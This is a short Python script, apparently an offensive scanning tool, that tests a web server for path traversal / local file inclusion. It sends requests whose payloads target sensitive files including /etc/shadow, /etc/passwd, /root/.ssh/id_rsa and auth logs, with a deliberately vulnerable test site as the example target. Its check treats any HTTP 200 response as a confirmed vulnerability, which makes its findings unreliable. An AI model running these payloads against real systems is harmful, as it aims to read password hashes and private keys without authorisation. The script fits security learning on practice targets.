import requests


def scan_lfi(url):
    payloads = [
        "../../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../../etc/shadow",
        "../../../../../../../../../../../etc/hosts",
        "../../../../../../../../../../../etc/hostname",
        "../../../../../../../../../../../etc/group",
        "../../../../../../../../../../../etc/issue",
        "../../../../../../../../../../../etc/mysql/my.cnf",
        "../../../../../../../../../../../etc/apache2/apache2.conf",
        "../../../../../../../../../../../etc/ssh/sshd_config",
        "../../../../../../../../../../../var/log/auth.log",
        "../../../../../../../../../../../var/mail/root",
        "../../../../../../../../../../../root/.ssh/id_rsa",
        # Add more payloads as needed
    ]

    for payload in payloads:
        target_url = f"{url}/{payload}"
        response = requests.get(target_url)

        if response.status_code == 200:
            print(f"[+] Found LFI vulnerability: {target_url}")
            # Do additional processing as required
        else:
            print(f"[-] Not vulnerable: {target_url}")

# Example usage
target_url = "http://testphp.vulnweb.com"
scan_lfi(target_url)
